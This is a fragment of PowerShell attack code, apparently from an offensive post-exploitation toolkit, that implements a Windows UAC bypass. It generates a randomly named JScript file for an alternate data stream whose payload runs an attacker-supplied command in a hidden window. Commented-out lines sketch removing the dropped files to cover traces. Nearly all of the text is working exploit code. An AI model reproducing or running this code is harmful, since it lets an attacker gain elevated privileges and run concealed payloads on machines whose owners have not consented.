function Invoke-WScriptBypassUAC
{
    ...
    function Local:Invoke-WscriptTrigger {
        ...
        $VBSfileName = [System.IO.Path]::GetRandomFileName() + ".js"
        $ADSFile = $VBSFileName -split '\.',([regex]::matches($VBSFileName,"\.").count) -join ''

        $VBSPayload = "var oFso = new ActiveXObject(""Scripting.FileSystemObject"")`;"
        $VBSPayload += "var objShell = new ActiveXObject(""WScript.Shell"")`;"
        $VBSPayload += "var command = ""$payload""`;"
        $VBSPayload += "objShell.Run(command, 0)`;"
        
        # stupid command to kick off a background cmd process to delete the wscript and manifest
        #$DelCommand = "$($env:WINDIR)\System32\cmd.exe /c start /b cmd /c timeout /t 5 >nul"
        #$VBSPayload += "var command2 = ""$DelCommand""`;"
        #$VBSPayload += "objShell.Run(command2, 0)`;"
